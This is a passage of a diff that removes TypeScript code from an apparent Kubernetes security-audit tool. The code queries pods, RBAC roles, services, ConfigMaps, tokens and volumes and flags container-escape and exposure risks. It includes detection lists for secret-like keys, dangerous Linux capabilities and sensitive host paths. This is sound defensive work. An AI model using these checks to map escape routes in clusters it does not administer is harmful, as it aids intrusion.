-                output += `| ${p.ns} | ${p.name} | ${p.container} | ${p.issues.join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'CRITICAL',
-                category: 'Pod Security',
-                finding: `${privilegedPods.length} pods running with privileged: true`,
-                details: 'Privileged containers can escape to host'
-              });
-              criticalCount++;
-            }
-            
-            if (hostNetworkPods.length > 0) {
-              output += `### ⚠️ Pods with Host Network\n\n`;
-              for (const p of hostNetworkPods.slice(0, 5)) {
-                output += `- \`${p.ns}/${p.name}\`\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'Pod Security',
-                finding: `${hostNetworkPods.length} pods using hostNetwork`,
-                details: 'Can access host network interfaces'
-              });
-              highCount++;
-            }
-            
-            if (hostPathPods.length > 0) {
-              output += `### ⚠️ Pods with Host Path Mounts\n\n`;
-              output += `| Namespace | Pod | Host Paths |\n|-----------|-----|------------|\n`;
-              for (const p of hostPathPods.slice(0, 10)) {
-                output += `| ${p.ns} | ${p.name} | ${p.paths.join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              const rootMounts = hostPathPods.filter(p => p.paths.some(path => path === '/' || path === '/etc'));
-              if (rootMounts.length > 0) {
-                findings.push({
-                  severity: 'CRITICAL',
-                  category: 'Pod Security',
-                  finding: `${rootMounts.length} pods mounting sensitive host paths`,
-                  details: 'Host filesystem access can lead to escape'
-                });
-                criticalCount++;
-              }
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze pods: ${e.message}\n\n`;
-          }
-
-          // ========== 6. NETWORK POLICIES ==========
-          output += `## 🌐 Network Policies\n\n`;
-          try {
-            const npCmd = namespace 
-              ? `get networkpolicies -n ${namespace} -o json`
-              : `get networkpolicies --all-namespaces -o json`;
-            const npJson = await runKubectl(npCmd);
-            const npItems = JSON.parse(npJson).items || [];
-            
-            const npCount = npItems.length;
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Network Policies | ${npCount} |\n\n`;
-            
-            if (npCount === 0) {
-              findings.push({
-                severity: 'CRITICAL',
-                category: 'Network',
-                finding: 'No network policies defined in cluster',
-                details: 'All pods can communicate freely'
-              });
-              criticalCount++;
-            }
-            
-            if (npCount > 0) {
-              output += `### 📋 Network Policies\n\n`;
-              output += `| Namespace | Policy Name |\n|-----------|-------------|\n`;
-              for (const np of npItems.slice(0, 10)) {
-                output += `| ${(np as any).metadata?.namespace} | ${(np as any).metadata?.name} |\n`;
-              }
-              output += '\n';
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze network policies: ${e.message}\n\n`;
-          }
-
-          // ========== 7. EXPOSED SERVICES ==========
-          output += `## 🌍 Exposed Services\n\n`;
-          try {
-            const svcCmd = namespace 
-              ? `get services -n ${namespace} -o json`
-              : `get services --all-namespaces -o json`;
-            const svcJson = await runKubectl(svcCmd);
-            const svcItems = JSON.parse(svcJson).items || [];
-            
-            const loadBalancers: Array<{ns: string; name: string; ip: string; ports: string[]}> = [];
-            const nodePortServices: Array<{ns: string; name: string; ports: string[]}> = [];
-            
-            for (const svc of svcItems) {
-              const svcName = (svc as any).metadata?.name || 'unknown';
-              const svcNs = (svc as any).metadata?.namespace || 'unknown';
-              
-              if ((svc as any).spec?.type === 'LoadBalancer') {
-                const ips = ((svc as any).status?.loadBalancer?.ingress || []).map((i: any) => i.ip || i.hostname || 'pending');
-                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.port}/${p.protocol}`);
-                loadBalancers.push({ ns: svcNs, name: svcName, ip: ips.join(', '), ports });
-              } else if ((svc as any).spec?.type === 'NodePort') {
-                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.nodePort}→${p.port}`);
-                nodePortServices.push({ ns: svcNs, name: svcName, ports });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Services | ${svcItems.length} |\n`;
-            output += `| LoadBalancer Services | ${loadBalancers.length} |\n`;
-            output += `| NodePort Services | ${nodePortServices.length} |\n\n`;
-            
-            if (loadBalancers.length > 0) {
-              output += `### 🔴 LoadBalancer Services (Internet Exposed)\n\n`;
-              output += `| Namespace | Service | External IP | Ports |\n|-----------|---------|-------------|-------|\n`;
-              for (const lb of loadBalancers) {
-                output += `| ${lb.ns} | ${lb.name} | ${lb.ip || 'pending'} | ${lb.ports.join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'Services',
-                finding: `${loadBalancers.length} LoadBalancer services exposed`,
-                details: 'Review if all require public access'
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze services: ${e.message}\n\n`;
-          }
-
-          // ========== 8. CONFIGMAPS ==========
-          output += `## 📄 ConfigMaps Analysis\n\n`;
-          try {
-            const cmCmd = namespace 
-              ? `get configmaps -n ${namespace} -o json`
-              : `get configmaps --all-namespaces -o json`;
-            const cmJson = await runKubectl(cmCmd);
-            const cmItems = JSON.parse(cmJson).items || [];
-            
-            const sensitiveConfigMaps: Array<{ns: string; name: string; keys: string[]}> = [];
-            const secretPatterns = ['password', 'secret', 'key', 'token', 'credential', 'apikey'];
-            
-            for (const cm of cmItems) {
-              const data = (cm as any).data || {};
-              const suspiciousKeys: string[] = [];
-              
-              for (const [key, value] of Object.entries(data)) {
-                if (secretPatterns.some(p => key.toLowerCase().includes(p))) {
-                  suspiciousKeys.push(key);
-                }
-              }
-              
-              if (suspiciousKeys.length > 0) {
-                sensitiveConfigMaps.push({
-                  ns: (cm as any).metadata?.namespace || 'unknown',
-                  name: (cm as any).metadata?.name || 'unknown',
-                  keys: suspiciousKeys
-                });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total ConfigMaps | ${cmItems.length} |\n`;
-            output += `| ConfigMaps with Potential Secrets | ${sensitiveConfigMaps.length} |\n\n`;
-            
-            if (sensitiveConfigMaps.length > 0) {
-              output += `### ⚠️ ConfigMaps with Potential Sensitive Data\n\n`;
-              output += `| Namespace | ConfigMap | Suspicious Keys |\n|-----------|-----------|------------------|\n`;
-              for (const cm of sensitiveConfigMaps.slice(0, 10)) {
-                output += `| ${cm.ns} | ${cm.name} | ${cm.keys.slice(0, 3).join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'ConfigMaps',
-                finding: `${sensitiveConfigMaps.length} ConfigMaps may contain secrets`,
-                details: 'Move secrets to Secrets or Key Vault'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze ConfigMaps: ${e.message}\n\n`;
-          }
-
-          // ========== 9. CLUSTER ROLES ANALYSIS ==========
-          output += `## 👑 Cluster Roles Analysis\n\n`;
-          try {
-            const crJson = await runKubectl('get clusterroles -o json');
-            const crItems = JSON.parse(crJson).items || [];
-            
-            const dangerousRoles: Array<{name: string; verbs: string[]; resources: string[]}> = [];
-            const wildcardRoles: Array<{name: string}> = [];
-            
-            for (const cr of crItems) {
-              const roleName = (cr as any).metadata?.name || 'unknown';
-              const rules = (cr as any).rules || [];
-              
-              for (const rule of rules) {
-                const verbs = rule.verbs || [];
-                const resources = rule.resources || [];
-                const apiGroups = rule.apiGroups || [];
-                
-                if (verbs.includes('*') || resources.includes('*')) {
-                  if (!wildcardRoles.find(r => r.name === roleName)) {
-                    wildcardRoles.push({ name: roleName });
-                  }
-                }
-                
-                const hasDangerousVerbs = ['create', 'update', 'patch', 'delete'].some(v => verbs.includes(v) || verbs.includes('*'));
-                const hasSensitiveResources = ['secrets', 'pods', 'deployments', 'daemonsets', 'roles', 'clusterroles', 'rolebindings', 'clusterrolebindings']
-                  .some(r => resources.includes(r) || resources.includes('*'));
-                
-                if (hasDangerousVerbs && hasSensitiveResources) {
-                  dangerousRoles.push({
-                    name: roleName,
-                    verbs: verbs.slice(0, 3),
-                    resources: resources.slice(0, 3)
-                  });
-                }
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Cluster Roles | ${crItems.length} |\n`;
-            output += `| Wildcard (*) Roles | ${wildcardRoles.length} |\n`;
-            output += `| High-Privilege Roles | ${dangerousRoles.length} |\n\n`;
-            
-            if (wildcardRoles.length > 5) {
-              output += `### 🚨 Roles with Wildcard Permissions\n\n`;
-              for (const r of wildcardRoles.slice(0, 10)) {
-                output += `- \`${r.name}\`\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'RBAC',
-                finding: `${wildcardRoles.length} cluster roles with wildcard (*) permissions`,
-                details: 'Wildcard permissions violate least privilege principle'
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze cluster roles: ${e.message}\n\n`;
-          }
-
-          // ========== 10. POD SECURITY CONTEXTS ==========
-          output += `## 🛡️ Pod Security Contexts\n\n`;
-          try {
-            const podsCmd = namespace
-              ? `get pods -n ${namespace} -o json`
-              : `get pods --all-namespaces -o json`;
-            const podsJson = await runKubectl(podsCmd);
-            const podItems = JSON.parse(podsJson).items || [];
-            
-            const runAsRootPods: Array<{ns: string; name: string}> = [];
-            const noSecurityContextPods: Array<{ns: string; name: string}> = [];
-            const capAddPods: Array<{ns: string; name: string; caps: string[]}> = [];
-            const hostPidPods: Array<{ns: string; name: string}> = [];
-            const hostIpcPods: Array<{ns: string; name: string}> = [];
-            
-            for (const pod of podItems) {
-              const podName = (pod as any).metadata?.name || 'unknown';
-              const podNs = (pod as any).metadata?.namespace || 'unknown';
-              const spec = (pod as any).spec || {};
-              
-              // Host PID namespace
-              if (spec.hostPID) {
-                hostPidPods.push({ ns: podNs, name: podName });
-              }
-              
-              // Host IPC namespace  
-              if (spec.hostIPC) {
-                hostIpcPods.push({ ns: podNs, name: podName });
-              }
-              
-              for (const container of (spec.containers || [])) {
-                const sc = container.securityContext || {};
-                
-                // No security context at all
-                if (!container.securityContext && !spec.securityContext) {
-                  if (!noSecurityContextPods.find(p => p.name === podName && p.ns === podNs)) {
-                    noSecurityContextPods.push({ ns: podNs, name: podName });
-                  }
-                }
-                
-                // Running as root
-                if (sc.runAsUser === 0 || sc.runAsNonRoot === false) {
-                  runAsRootPods.push({ ns: podNs, name: podName });
-                }
-                
-                // Added capabilities (potential privilege escalation)
-                const addedCaps = sc.capabilities?.add || [];
-                if (addedCaps.length > 0) {
-                  capAddPods.push({ ns: podNs, name: podName, caps: addedCaps });
-                }
-              }
-            }
-            
-            output += `| Security Check | Count |\n|----------------|-------|\n`;
-            output += `| Pods without Security Context | ${noSecurityContextPods.length} |\n`;
-            output += `| Pods running as root | ${runAsRootPods.length} |\n`;
-            output += `| Pods with added capabilities | ${capAddPods.length} |\n`;
-            output += `| Pods with hostPID | ${hostPidPods.length} |\n`;
-            output += `| Pods with hostIPC | ${hostIpcPods.length} |\n\n`;
-            
-            if (hostPidPods.length > 0) {
-              output += `### 🚨 Pods with Host PID Namespace (Container Escape Risk)\n\n`;
-              for (const p of hostPidPods.slice(0, 5)) {
-                output += `- \`${p.ns}/${p.name}\`\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'CRITICAL',
-                category: 'Container Escape',
-                finding: `${hostPidPods.length} pods sharing host PID namespace`,
-                details: 'Can see and signal host processes - container escape vector'
-              });
-              criticalCount++;
-            }
-            
-            if (capAddPods.length > 0) {
-              const dangerousCaps = ['SYS_ADMIN', 'SYS_PTRACE', 'NET_ADMIN', 'DAC_OVERRIDE', 'SETUID', 'SETGID'];
-              const criticalCapPods = capAddPods.filter(p => p.caps.some(c => dangerousCaps.includes(c)));
-              
-              if (criticalCapPods.length > 0) {
-                output += `### 🚨 Pods with Dangerous Capabilities\n\n`;
-                output += `| Namespace | Pod | Capabilities |\n|-----------|-----|---------------|\n`;
-                for (const p of criticalCapPods.slice(0, 10)) {
-                  output += `| ${p.ns} | ${p.name} | ${p.caps.join(', ')} |\n`;
-                }
-                output += '\n';
-                
-                findings.push({
-                  severity: 'CRITICAL',
-                  category: 'Capabilities',
-                  finding: `${criticalCapPods.length} pods with dangerous Linux capabilities`,
-                  details: 'SYS_ADMIN/SYS_PTRACE/etc enable container escape'
-                });
-                criticalCount++;
-              }
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze security contexts: ${e.message}\n\n`;
-          }
-
-          // ========== 11. INGRESS ANALYSIS ==========
-          output += `## 🚪 Ingress Controllers\n\n`;
-          try {
-            const ingCmd = namespace
-              ? `get ingress -n ${namespace} -o json`
-              : `get ingress --all-namespaces -o json`;
-            const ingJson = await runKubectl(ingCmd);
-            const ingItems = JSON.parse(ingJson).items || [];
-            
-            const exposedIngresses: Array<{ns: string; name: string; hosts: string[]; tls: boolean}> = [];
-            
-            for (const ing of ingItems) {
-              const ingName = (ing as any).metadata?.name || 'unknown';
-              const ingNs = (ing as any).metadata?.namespace || 'unknown';
-              const rules = (ing as any).spec?.rules || [];
-              const tls = ((ing as any).spec?.tls || []).length > 0;
-              
-              const hosts = rules.map((r: any) => r.host || '*').filter(Boolean);
-              exposedIngresses.push({ ns: ingNs, name: ingName, hosts, tls });
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Ingresses | ${ingItems.length} |\n`;
-            output += `| Without TLS | ${exposedIngresses.filter(i => !i.tls).length} |\n\n`;
-            
-            if (exposedIngresses.length > 0) {
-              output += `### 📋 Ingress Resources\n\n`;
-              output += `| Namespace | Ingress | Hosts | TLS |\n|-----------|---------|-------|-----|\n`;
-              for (const ing of exposedIngresses.slice(0, 10)) {
-                output += `| ${ing.ns} | ${ing.name} | ${ing.hosts.join(', ')} | ${ing.tls ? '✅' : '❌'} |\n`;
-              }
-              output += '\n';
-              
-              const noTls = exposedIngresses.filter(i => !i.tls);
-              if (noTls.length > 0) {
-                findings.push({
-                  severity: 'MEDIUM',
-                  category: 'Ingress',
-                  finding: `${noTls.length} ingresses without TLS encryption`,
-                  details: 'Traffic exposed in plain HTTP'
-                });
-                mediumCount++;
-              }
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze ingresses: ${e.message}\n\n`;
-          }
-
-          // ========== 12. DAEMONSETS ANALYSIS ==========
-          output += `## 🔄 DaemonSets (Node-Wide Pods)\n\n`;
-          try {
-            const dsJson = await runKubectl('get daemonsets --all-namespaces -o json');
-            const dsItems = JSON.parse(dsJson).items || [];
-            
-            const privilegedDs: Array<{ns: string; name: string; issues: string[]}> = [];
-            
-            for (const ds of dsItems) {
-              const dsName = (ds as any).metadata?.name || 'unknown';
-              const dsNs = (ds as any).metadata?.namespace || 'unknown';
-              const spec = (ds as any).spec?.template?.spec || {};
-              const issues: string[] = [];
-              
-              if (spec.hostNetwork) issues.push('hostNetwork');
-              if (spec.hostPID) issues.push('hostPID');
-              if (spec.hostIPC) issues.push('hostIPC');
-              
-              for (const container of (spec.containers || [])) {
-                if (container.securityContext?.privileged) {
-                  issues.push('privileged');
-                }
-              }
-              
-              if (issues.length > 0) {
-                privilegedDs.push({ ns: dsNs, name: dsName, issues });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total DaemonSets | ${dsItems.length} |\n`;
-            output += `| Privileged DaemonSets | ${privilegedDs.length} |\n\n`;
-            
-            if (privilegedDs.length > 0) {
-              output += `### ⚠️ DaemonSets with Elevated Privileges\n\n`;
-              output += `| Namespace | DaemonSet | Issues |\n|-----------|-----------|--------|\n`;
-              for (const ds of privilegedDs.slice(0, 10)) {
-                output += `| ${ds.ns} | ${ds.name} | ${ds.issues.join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              // DaemonSets run on all nodes - privileged ones are critical
-              findings.push({
-                severity: 'HIGH',
-                category: 'DaemonSets',
-                finding: `${privilegedDs.length} privileged DaemonSets (runs on ALL nodes)`,
-                details: 'DaemonSets with host access affect entire cluster'
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze DaemonSets: ${e.message}\n\n`;
-          }
-
-          // ========== 13. JWT TOKEN ANALYSIS ==========
-          output += `## 🎫 Service Account Token Analysis\n\n`;
-          try {
-            const tokenSecretsCmd = `get secrets --all-namespaces -o json`;
-            const tokenJson = await runKubectl(tokenSecretsCmd);
-            const allSecrets = JSON.parse(tokenJson).items || [];
-            
-            const saTokens = allSecrets.filter((s: any) => s.type === 'kubernetes.io/service-account-token');
-            const longLivedTokens: Array<{ns: string; name: string; sa: string}> = [];
-            
-            for (const token of saTokens) {
-              const tokenNs = (token as any).metadata?.namespace || 'unknown';
-              const tokenName = (token as any).metadata?.name || 'unknown';
-              const annotations = (token as any).metadata?.annotations || {};
-              const saName = annotations['kubernetes.io/service-account.name'] || 'unknown';
-              
-              // Legacy long-lived tokens (pre-1.24 style)
-              longLivedTokens.push({ ns: tokenNs, name: tokenName, sa: saName });
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Service Account Tokens | ${saTokens.length} |\n`;
-            output += `| Legacy Long-Lived Tokens | ${longLivedTokens.length} |\n\n`;
-            
-            if (longLivedTokens.length > 20) {
-              output += `### ⚠️ Service Account Tokens (Potential Attack Vector)\n\n`;
-              output += `Many long-lived tokens exist. In K8s 1.24+, prefer bound tokens.\n\n`;
-              
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'Tokens',
-                finding: `${longLivedTokens.length} long-lived SA tokens (legacy style)`,
-                details: 'Migrate to short-lived bound tokens (K8s 1.24+)'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze tokens: ${e.message}\n\n`;
-          }
-
-          // ========== 14. CONTAINER IMAGE SECURITY ==========
-          output += `## 🐋 Container Image Security\n\n`;
-          try {
-            const podsCmd = namespace
-              ? `get pods -n ${namespace} -o json`
-              : `get pods --all-namespaces -o json`;
-            const podsJson = await runKubectl(podsCmd);
-            const podItems = JSON.parse(podsJson).items || [];
-            
-            const latestTagImages: Array<{ns: string; pod: string; image: string}> = [];
-            const publicRegistryImages: Array<{ns: string; pod: string; image: string}> = [];
-            const noPullPolicyImages: Array<{ns: string; pod: string; image: string}> = [];
-            const allImages = new Set<string>();
-            
-            const publicRegistries = ['docker.io', 'gcr.io', 'ghcr.io', 'quay.io', 'registry.hub.docker.com'];
-            
-            for (const pod of podItems) {
-              const podName = (pod as any).metadata?.name || 'unknown';
-              const podNs = (pod as any).metadata?.namespace || 'unknown';
-              
-              for (const container of ((pod as any).spec?.containers || [])) {
-                const image = container.image || '';
-                const pullPolicy = container.imagePullPolicy || '';
-                allImages.add(image);
-                
-                if (image.endsWith(':latest') || !image.includes(':')) {
-                  latestTagImages.push({ ns: podNs, pod: podName, image });
-                }
-                
-                const isPublic = !image.includes('/') || publicRegistries.some(r => image.startsWith(r));
-                if (isPublic && !image.includes('.azurecr.io') && !image.includes('.ecr.')) {
-                  publicRegistryImages.push({ ns: podNs, pod: podName, image });
-                }
-                
-                if (!pullPolicy || pullPolicy === 'IfNotPresent') {
-                  noPullPolicyImages.push({ ns: podNs, pod: podName, image });
-                }
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Unique Images | ${allImages.size} |\n`;
-            output += `| Using :latest tag | ${latestTagImages.length} |\n`;
-            output += `| Public Registry Images | ${publicRegistryImages.length} |\n`;
-            output += `| Missing Pull Policy | ${noPullPolicyImages.length} |\n\n`;
-            
-            if (latestTagImages.length > 0) {
-              output += `### ⚠️ Images Using :latest Tag\n\n`;
-              output += `| Namespace | Pod | Image |\n|-----------|-----|-------|\n`;
-              for (const img of latestTagImages.slice(0, 10)) {
-                output += `| ${img.ns} | ${img.pod} | ${img.image.substring(0, 50)}... |\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'Images',
-                finding: `${latestTagImages.length} containers using :latest tag`,
-                details: 'Use immutable tags for reproducibility and security'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze container images: ${e.message}\n\n`;
-          }
-
-          // ========== 15. CRONJOBS ANALYSIS ==========
-          output += `## ⏰ CronJobs Analysis\n\n`;
-          try {
-            const cronJson = await runKubectl('get cronjobs --all-namespaces -o json');
-            const cronItems = JSON.parse(cronJson).items || [];
-            
-            const privilegedCronJobs: Array<{ns: string; name: string; schedule: string; issues: string[]}> = [];
-            
-            for (const cron of cronItems) {
-              const cronName = (cron as any).metadata?.name || 'unknown';
-              const cronNs = (cron as any).metadata?.namespace || 'unknown';
-              const schedule = (cron as any).spec?.schedule || 'unknown';
-              const jobSpec = (cron as any).spec?.jobTemplate?.spec?.template?.spec || {};
-              const issues: string[] = [];
-              
-              if (jobSpec.hostNetwork) issues.push('hostNetwork');
-              if (jobSpec.hostPID) issues.push('hostPID');
-              
-              for (const container of (jobSpec.containers || [])) {
-                if (container.securityContext?.privileged) issues.push('privileged');
-                if (container.securityContext?.runAsUser === 0) issues.push('runAsRoot');
-              }
-              
-              if (issues.length > 0) {
-                privilegedCronJobs.push({ ns: cronNs, name: cronName, schedule, issues });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total CronJobs | ${cronItems.length} |\n`;
-            output += `| Privileged CronJobs | ${privilegedCronJobs.length} |\n\n`;
-            
-            if (privilegedCronJobs.length > 0) {
-              output += `### 🚨 CronJobs with Elevated Privileges\n\n`;
-              output += `| Namespace | CronJob | Schedule | Issues |\n|-----------|---------|----------|--------|\n`;
-              for (const cj of privilegedCronJobs.slice(0, 10)) {
-                output += `| ${cj.ns} | ${cj.name} | ${cj.schedule} | ${cj.issues.join(', ')} |\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'CronJobs',
-                finding: `${privilegedCronJobs.length} CronJobs with elevated privileges`,
-                details: 'Scheduled tasks with host access - persistence vector'
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze CronJobs: ${e.message}\n\n`;
-          }
-
-          // ========== 16. PERSISTENT VOLUMES ==========
-          output += `## 💾 Persistent Volumes\n\n`;
-          try {
-            const pvJson = await runKubectl('get pv -o json');
-            const pvItems = JSON.parse(pvJson).items || [];
-            
-            const hostPathPvs: Array<{name: string; path: string; capacity: string}> = [];
-            const nfsShares: Array<{name: string; server: string; path: string}> = [];
-            
-            for (const pv of pvItems) {
-              const pvName = (pv as any).metadata?.name || 'unknown';
-              const capacity = (pv as any).spec?.capacity?.storage || 'unknown';
-              
-              if ((pv as any).spec?.hostPath) {
-                hostPathPvs.push({
-                  name: pvName,
-                  path: (pv as any).spec.hostPath.path,
-                  capacity
-                });
-              }
-              
-              if ((pv as any).spec?.nfs) {
-                nfsShares.push({
-                  name: pvName,
-                  server: (pv as any).spec.nfs.server,
-                  path: (pv as any).spec.nfs.path
-                });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total PVs | ${pvItems.length} |\n`;
-            output += `| HostPath PVs | ${hostPathPvs.length} |\n`;
-            output += `| NFS Shares | ${nfsShares.length} |\n\n`;
-            
-            if (hostPathPvs.length > 0) {
-              output += `### 🚨 HostPath Persistent Volumes\n\n`;
-              output += `| PV Name | Host Path | Capacity |\n|---------|-----------|----------|\n`;
-              for (const pv of hostPathPvs.slice(0, 10)) {
-                output += `| ${pv.name} | ${pv.path} | ${pv.capacity} |\n`;
-              }
-              output += '\n';
-              
-              const sensitivePaths = hostPathPvs.filter(p => 
-                p.path === '/' || p.path.startsWith('/etc') || p.path.startsWith('/var') || p.path.startsWith('/root')
-              );
-              
-              if (sensitivePaths.length > 0) {
-                findings.push({
-                  severity: 'CRITICAL',
-                  category: 'Storage',
-                  finding: `${sensitivePaths.length} PVs expose sensitive host paths`,
-                  details: 'HostPath PVs can enable container escape'
-                });
-                criticalCount++;
-              }
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze PVs: ${e.message}\n\n`;
-          }
-
-          // ========== 17. RESOURCE LIMITS ==========
-          output += `## 📊 Resource Limits (DoS Prevention)\n\n`;
-          try {
-            const podsCmd = namespace
-              ? `get pods -n ${namespace} -o json`
-              : `get pods --all-namespaces -o json`;
-            const podsJson = await runKubectl(podsCmd);
-            const podItems = JSON.parse(podsJson).items || [];
-            
-            let noLimitsCount = 0;
-            let noRequestsCount = 0;
-            const unlimitedPods: Array<{ns: string; name: string}> = [];
-            
-            for (const pod of podItems) {
-              const podName = (pod as any).metadata?.name || 'unknown';
-              const podNs = (pod as any).metadata?.namespace || 'unknown';
-              let hasLimits = false;
-              let hasRequests = false;
-              
-              for (const container of ((pod as any).spec?.containers || [])) {
-                if (container.resources?.limits) hasLimits = true;
-                if (container.resources?.requests) hasRequests = true;
-              }
-              
-              if (!hasLimits) {
-                noLimitsCount++;
-                unlimitedPods.push({ ns: podNs, name: podName });
-              }
-              if (!hasRequests) noRequestsCount++;
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Pods | ${podItems.length} |\n`;
-            output += `| Pods without Limits | ${noLimitsCount} |\n`;
-            output += `| Pods without Requests | ${noRequestsCount} |\n\n`;
-            
-            const unlimitedPercent = podItems.length > 0 ? Math.round((noLimitsCount / podItems.length) * 100) : 0;
-            if (unlimitedPercent > 50) {
-              findings.push({
-                severity: 'LOW',
-                category: 'Resources',
-                finding: `${unlimitedPercent}% of pods have no resource limits`,
-                details: 'Missing limits can lead to DoS via resource exhaustion'
-              });
-              lowCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze resource limits: ${e.message}\n\n`;
-          }
-
-          // ========== 18. KUBERNETES VERSION ==========
-          output += `## 🔖 Kubernetes Version\n\n`;
-          try {
-            const versionJson = await runKubectl('version -o json');
-            const versionData = JSON.parse(versionJson);
-            
-            const serverVersion = versionData.serverVersion || {};
-            const major = serverVersion.major || '?';
-            const minor = serverVersion.minor || '?';
-            const gitVersion = serverVersion.gitVersion || 'unknown';
-            
-            output += `| Component | Version |\n|-----------|---------||\n`;
-            output += `| Server | ${gitVersion} |\n`;
-            output += `| Major.Minor | ${major}.${minor} |\n\n`;
-            
-            const minorNum = parseInt(minor);
-            if (minorNum < 25) {
-              output += `### ⚠️ Outdated Kubernetes Version\n\n`;
-              output += `Version ${major}.${minor} may have known CVEs. Consider upgrading.\n\n`;
-              
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'Version',
-                finding: `Kubernetes ${major}.${minor} may be outdated`,
-                details: 'Check for CVEs: https://kubernetes.io/docs/reference/issues-security/official-cve-feed/'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to get K8s version: ${e.message}\n\n`;
-          }
-
-          // ========== 19. POD SECURITY STANDARDS ==========
-          output += `## 🛡️ Pod Security Standards (PSS)\n\n`;
-          try {
-            const nsJson = await runKubectl('get namespaces -o json');
-            const nsItems = JSON.parse(nsJson).items || [];
-            
-            const enforcedNs: Array<{name: string; level: string}> = [];
-            const unenforced: string[] = [];
-            
-            for (const ns of nsItems) {
-              const nsName = (ns as any).metadata?.name || 'unknown';
-              const labels = (ns as any).metadata?.labels || {};
-              
-              const enforceLevel = labels['pod-security.kubernetes.io/enforce'];
-              const warnLevel = labels['pod-security.kubernetes.io/warn'];
-              
-              if (enforceLevel) {
-                enforcedNs.push({ name: nsName, level: enforceLevel });
-              } else if (!['kube-system', 'kube-public', 'kube-node-lease'].includes(nsName)) {
-                unenforced.push(nsName);
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Namespaces with PSS Enforce | ${enforcedNs.length} |\n`;
-            output += `| Namespaces without PSS | ${unenforced.length} |\n\n`;
-            
-            if (enforcedNs.length > 0) {
-              output += `### ✅ Namespaces with Pod Security Standards\n\n`;
-              output += `| Namespace | Enforce Level |\n|-----------|---------------|\n`;
-              for (const ns of enforcedNs.slice(0, 10)) {
-                output += `| ${ns.name} | ${ns.level} |\n`;
-              }
-              output += '\n';
-            }
-            
-            if (unenforced.length > 5) {
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'PSS',
-                finding: `${unenforced.length} namespaces without Pod Security Standards`,
-                details: 'Enable PSS labels for namespace-level security'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze PSS: ${e.message}\n\n`;
-          }
-
-          // ========== 20. ATTACK SURFACE SUMMARY ==========
-          output += `## 🎯 Attack Surface Summary\n\n`;
-          output += `Based on [Kubernetes Pentest Methodology](https://exploit-notes.hdks.org/exploit/container/kubernetes/):\n\n`;
-          output += `| Attack Vector | Risk Level | Notes |\n|---------------|------------|-------|\n`;
-          
-          // Summarize attack vectors found
-          const attackVectors: Array<{vector: string; risk: string; notes: string}> = [];
-          
-          if (criticalCount > 0) {
-            attackVectors.push({ vector: 'Container Escape', risk: '🔴 CRITICAL', notes: 'Privileged containers or host namespaces found' });
-          }
-          if (findings.some(f => f.category === 'RBAC')) {
-            attackVectors.push({ vector: 'RBAC Escalation', risk: '🟠 HIGH', notes: 'Overprivileged roles or bindings' });
-          }
-          if (findings.some(f => f.category === 'Secrets')) {
-            attackVectors.push({ vector: 'Secret Theft', risk: '🟠 HIGH', notes: 'Accessible secrets for lateral movement' });
-          }
-          if (findings.some(f => f.category === 'Network')) {
-            attackVectors.push({ vector: 'Lateral Movement', risk: '🔴 CRITICAL', notes: 'No network policies - unrestricted pod-to-pod' });
-          }
-          if (findings.some(f => f.category === 'Services')) {
-            attackVectors.push({ vector: 'External Exposure', risk: '🟠 HIGH', notes: 'Internet-facing services' });
-          }
-          
-          for (const av of attackVectors) {
-            output += `| ${av.vector} | ${av.risk} | ${av.notes} |\n`;
-          }
-          if (attackVectors.length === 0) {
-            output += `| None Critical | 🟢 LOW | Basic hardening in place |\n`;
-          }
